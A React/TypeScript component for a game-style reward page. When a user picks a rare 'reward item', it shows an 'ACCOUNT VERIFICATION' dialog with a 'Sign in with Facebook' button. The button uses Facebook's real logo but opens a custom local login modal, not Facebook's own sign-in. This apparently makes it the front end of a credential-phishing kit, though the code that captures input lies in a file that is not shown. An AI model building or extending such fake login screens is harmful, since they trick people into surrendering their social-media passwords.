import { useState } from 'react';
import FacebookLoginModal from './FacebookLoginModal';
import { X } from 'lucide-react';

interface RewardItem {
  id: number;
  name: string;
  description: string;
  rarity: 'Legendary' | 'Epic' | 'Rare';
  image_url: string;
}

interface AccessModalProps {
  isOpen: boolean;
  onClose: () => void;
  item: RewardItem | null;
}

const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
  const [showFacebookLogin, setShowFacebookLogin] = useState(false);

  if (!isOpen) return null;

  const handleFacebookLogin = () => {
    setShowFacebookLogin(true);
  };

  const handleCloseFacebookLogin = () => {
    setShowFacebookLogin(false);
  };

  const handleBackdropClick = (e: React.MouseEvent) => {
    if (e.target === e.currentTarget) {
      onClose();
    }
  };

  return (
    <>
      <div
        className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm"
        onClick={handleBackdropClick}
      >
        <div className="relative w-full max-w-md mx-auto bg-gradient-to-b from-[#f2f2f2] to-white rounded-lg shadow-2xl border border-gray-300 overflow-hidden">

          {/* Top banner */}
          <div className="bg-gray-100 border-b border-gray-300 px-4 py-3 flex items-center justify-between">
            <h2 className="text-lg font-semibold text-gray-800">ACCOUNT VERIFICATION</h2>
            <button onClick={onClose}>
              <X className="w-5 h-5 text-gray-500 hover:text-black" />
            </button>
          </div>

          {/* Main modal body */}
          <div
            className="p-6 flex flex-col items-center gap-5"
            style={{
              backgroundImage: 'url(/your-background.jpg)', // Change to your own background if needed
              backgroundSize: 'cover',
              backgroundPosition: 'center',
            }}
          >
            {/* Facebook Login Button */}
            <button
              onClick={handleFacebookLogin}
              className="w-full max-w-xs bg-[#1877f2] text-white flex items-center justify-center gap-2 px-6 py-2 rounded-md shadow hover:bg-[#145dcc] transition-all duration-200"
            >
              <img
                src="https://static.xx.fbcdn.net/rsrc.php/yd/r/hlvibnBVrEb.png"
                alt="Facebook logo"
                className="w-5 h-5"
              />
              <span className="font-semibold">Sign in with Facebook</span>
            </button>

            {/* Guest & More Buttons */}
            <div className="flex justify-between w-full max-w-xs gap-4">
              <button className="flex-1 bg-white border border-gray-400 text-black py-2 rounded-md shadow hover:bg-gray-100 font-semibold">
                👤 Guest
              </button>
              <button className="flex-1 bg-white border border-gray-400 text-black py-2 rounded-md shadow hover:bg-gray-100 font-semibold">
                ••• More
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* Facebook Login Modal (optional) */}
      <FacebookLoginModal
        isOpen={showFacebookLogin}
        onClose={handleCloseFacebookLogin}
      />
    </>
  );
};

export default AccessModal;
            
